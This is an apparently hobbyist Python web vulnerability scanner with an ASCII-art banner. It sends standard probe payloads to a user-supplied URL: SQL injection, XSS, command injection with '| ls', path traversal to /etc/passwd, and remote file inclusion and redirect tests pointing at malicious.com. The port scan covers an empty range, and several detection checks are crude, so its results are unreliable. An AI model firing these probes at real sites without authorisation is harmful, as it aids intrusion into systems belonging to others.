import socket
import ssl
import requests
import logging
import json
from datetime import datetime
from tqdm import tqdm
from pystyle import *

print("""\33[91;1m
+-+-+-+-+-+-+-+-+
|J|O|K|K|E|E|E|R|
+-+-+-+-+-+-+-+-+                     
┏┓┏┓┳┏┓         ┳┓┏┓┏┳┓
┃ ┗┓┣┫┣ ━━━━━━━ ┣┫┣┫ ┃                                   
┗┛┗┛┛┗┻         ┛┗┛┗ ┻                                   
                .------------------------------------.
                | V.5 SUPER Tools BTN.T , V1.4.9 BT2 |
                '------------------------------------'                            
+-+-+-+-+-+-+-+-++-+-+-+
|M|O|H|A|M|M|E|D|A|L|A|A
+-+-+-+-+-+-+-+-++-+-+-+                                                                                                                                                         
\33[39;0m""")


# إعداد ملف السجل لتخزين الأحداث بصيغة JSON
logging.basicConfig(filename="scan_report_websites.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

scan_results = {}

def save_results_to_json():
    with open("scan_report_websites.json", "w") as f:
        json.dump(scan_results, f, indent=4)

def scan_ports():
    open_ports = []
    for port in tqdm(range(1, 1), desc="\33[36;1m[\33[39;0m-\33[96;1m]\33[39;0m Scanning All Ports\33[39;0m",unit='\33[33;2m 𝗟𝗼𝗮𝗱𝗶𝗻𝗴…… \33[39;0m'):

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(0.5)
            result = sock.connect_ex(("localhost", port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except Exception as e:
            logging.error(f"Error scanning port {port}: {e}")
    logging.info(f"Open Ports: {open_ports}")
    scan_results['open_ports'] = open_ports
    return open_ports

def check_ssl_cert(domain):
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                logging.info(f"SSL Certificate for {domain}: {cert}")
                scan_results['ssl_certificate'] = cert
                return cert
    except Exception as e:
        logging.error(f"Error checking SSL certificate for {domain}: {e}")
        return None

def test_vulnerability(url, vuln_type, test_func):
    try:
        if test_func(url):
            logging.info(f"{vuln_type} vulnerability found at {url}")
            scan_results[vuln_type] = {"status": "vulnerable", "url": url}
            return True
        else:
            scan_results[vuln_type] = {"status": "not vulnerable", "url": url}
            return False
    except Exception as e:
        logging.error(f"Error testing {vuln_type} at {url}: {e}")
        scan_results[vuln_type] = {"status": "error", "message": str(e)}
        return False

def sql_injection_test(url):
    payload = "' OR '1'='1"
    test_url = f"{url}?id={payload}"
    response = requests.get(test_url, timeout=5)
    return "syntax error" in response.text or "mysql" in response.text

def xss_test(url):
    payload = "<script>alert('XSS')</script>"
    response = requests.post(url, data={"input": payload}, timeout=5)
    return payload in response.text

def csrf_test(url):
    response = requests.get(url, timeout=5)
    return "csrf_token" not in response.text

def rce_test(url):
    payload = "; echo vulnerable"
    test_url = f"{url}?cmd={payload}"
    response = requests.get(test_url, timeout=5)
    return "vulnerable" in response.text

def rfi_test(url):
    payload = "http://malicious.com/shell.txt"
    test_url = f"{url}?file={payload}"
    response = requests.get(test_url, timeout=5)
    return "shell" in response.text

def directory_traversal_test(url):
    payload = "../../etc/passwd"
    test_url = f"{url}?file={payload}"
    response = requests.get(test_url, timeout=5)
    return "root:" in response.text

def command_injection_test(url):
    payload = "| ls"
    test_url = f"{url}?cmd={payload}"
    response = requests.get(test_url, timeout=5)
    return "bin" in response.text

def open_redirect_test(url):
    payload = "http://malicious.com"
    test_url = f"{url}?redirect={payload}"
    response = requests.get(test_url, allow_redirects=False, timeout=5)
    return response.status_code == 302 and "malicious" in response.headers.get("Location", "")

def gather_ip(url):
    try:
        ip_address = socket.gethostbyname(url)
        logging.info(f"IP Address for {url}: {ip_address}")
        scan_results['ip_address'] = ip_address
        return ip_address
    except Exception as e:
        logging.error(f"Error fetching IP for {url}: {e}")
        return None

def perform_scan(target_url):
    print("\33[96;1m[\33[39;0m\33[91;1m-\33[39;0m\33[96;1m]\33[92;1m Starting scan for Link...\33[39;0m", f"[ {target_url} ]\33[91;1m 𝗟𝗼𝗮𝗱𝗶𝗻𝗴……\33[39;0m")
    print("﹌" * 10)
    logging.info(f"Starting scan for {target_url}")


    open_ports = scan_ports()
    ssl_cert = check_ssl_cert(target_url)
    gather_ip(target_url)

    # الفحص عن كل ثغرة مع إظهار تقدم الفحص
    vulnerabilities = [
        ("SQL Injection", sql_injection_test),
        ("XSS", xss_test),
        ("CSRF", csrf_test),
        ("RCE", rce_test),
        ("RFI", rfi_test),
        ("Directory Traversal", directory_traversal_test),
        ("Command Injection", command_injection_test),
        ("Open Redirect", open_redirect_test)
    ]


    for vuln_type, test_func in tqdm(vulnerabilities, desc="\33[36;1m[\33[39;0m-\33[96;1m]\33[39;0m\33[33;1m Testing vulnerabilities\33[39;0m",unit='\33[95;1m Wait For End Scan...\33[39;0m'):
        test_vulnerability(target_url, vuln_type, test_func)


    print(f"\n\33[94;1mScan completed for This :| \33[39;0m{target_url}")
    logging.info(f"Completed scan for Link :{target_url}")
    print("﹌" * 10)
    save_results_to_json()

# طلب الرابط من المستخدم وتنفيذ الفحص
target_url = input("\33[96;1m[\33[39;0m\33[91;1m-\33[39;0m\33[96;1m]\33[39;0m\33[93;2m Enter the URL to scan : \33[39;0m")
print("﹌" * 10)
perform_scan(target_url)

